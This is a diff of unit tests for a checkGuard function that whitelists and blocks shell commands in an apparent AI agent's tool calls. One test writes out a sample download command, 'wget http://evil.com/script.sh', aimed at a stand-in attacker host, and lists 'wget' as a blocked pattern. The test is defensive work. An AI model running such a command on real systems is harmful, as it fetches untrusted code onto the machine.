@@ -60,4 +60,30 @@ describe('checkGuard', () => {
     const result = checkGuard(action, '/workspace');
     expect(result.requiresApproval).toBe(true);
   });
+
+  it('should block command not in whitelist', () => {
+    const action: Action = { type: 'tool_call', tool: 'shell', args: { command: 'python script.py' } };
+    const result = checkGuard(action, '/workspace', [], ['npm', 'node', 'git']);
+    expect(result.blocked).toBe(true);
+    expect(result.reason).toContain('不在白名单中');
+  });
+
+  it('should allow command in whitelist', () => {
+    const action: Action = { type: 'tool_call', tool: 'shell', args: { command: 'npm test' } };
+    const result = checkGuard(action, '/workspace', [], ['npm', 'node', 'git']);
+    expect(result.blocked).toBe(false);
+  });
+
+  it('should block command with extra blocked pattern', () => {
+    const action: Action = { type: 'tool_call', tool: 'shell', args: { command: 'wget http://evil.com/script.sh' } };
+    const result = checkGuard(action, '/workspace', ['wget'], []);
+    expect(result.requiresApproval).toBe(true);
+  });
+
+  it('should allow command when whitelist is empty', () => {
+    const action: Action = { type: 'tool_call', tool: 'shell', args: { command: 'python script.py' } };
+    const result = checkGuard(action, '/workspace', [], []);
+    expect(result.blocked).toBe(false);
+    expect(result.requiresApproval).toBe(false);
+  });
 });
